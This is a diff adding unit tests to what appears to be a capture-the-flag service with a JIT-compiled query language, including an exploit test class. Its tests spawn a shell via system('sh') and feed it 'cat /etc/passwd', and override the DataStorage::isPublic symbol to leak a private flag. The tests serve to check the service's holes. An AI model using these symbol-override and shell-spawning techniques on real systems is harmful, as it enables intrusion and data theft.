@@ -106,6 +106,46 @@ class QueriesTestCase(CompileTestCase):
         self.assertEqual('["mkb"]', self.run_last('one_member', 'saarsec'))
         self.assertEqual('200', self.run_last('team_points', 'saarsec'))
 
+    def test_privacy(self):
+        compile('query jit_entrypoint on private1;', self.tmpdir / 'code.so')
+        r = subprocess.run([str(self.tmpdir / 'code.so'), 'jit_entrypoint'], cwd=DEMO_DIR,
+                           stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        self.assertNotEqual(0, r.returncode)
+        self.assertNotIn(b'SAAR', r.stdout)
+        self.assertIn(b'access denied', r.stderr)
+
+
+class ExploitsTestCase(CompileTestCase):
+    def test_system(self):
+        code = '''
+        // no function checks => we can call any symbol in any library. just the calling convention is an issue
+        func jit_rt_constant(){}  // nop out that rt function - constant string is in $rdi after return. Unfortunately in "".
+        func jit_entrypoint() { system("sh"); }  // then we can invoke system() which links properly
+        '''
+        # not sure how realistic it is that we can send input to the executable.
+        # maybe if we just bind the connection to the program?
+        compile(code, self.tmpdir / 'code.so')
+        p = subprocess.Popen([str(self.tmpdir / 'code.so'), 'jit_entrypoint'], cwd=DEMO_DIR,
+                             stdout=subprocess.PIPE, stdin=subprocess.PIPE)
+        output, _ = p.communicate(input=b'cat /etc/passwd', timeout=3)
+        self.assertIn(b'root:x:0:0:root:/root:/bin/bash', output)
+
+    def test_system_2(self):
+        # TODO find some helper gadget which allows us to load arbitrary strings to $rdi
+        pass
+
+    def test_nop_out_privacy_check(self):
+        # we can override the libjit_rt symbol which determines a collection's privacy (DataStorage::isPublic).
+        code = '''
+        func _ZN11DataStorage8isPublicEv(){ return true; }
+        query jit_entrypoint on private1;  // some private collection
+        '''
+        self.assertEqual('[{"flag":"SAAR{...}"}]', self.run_prog(code))
+
+    # other weaknesses: you can read/write the stack like this:
+    # func f(a,b,c,d,e,f,g,h) { h=0; }  func jit_entrypoint() { f(); }
+    # but that's likely not exploitable, because pointers are no valid Value
+
 
 del CompileTestCase
 
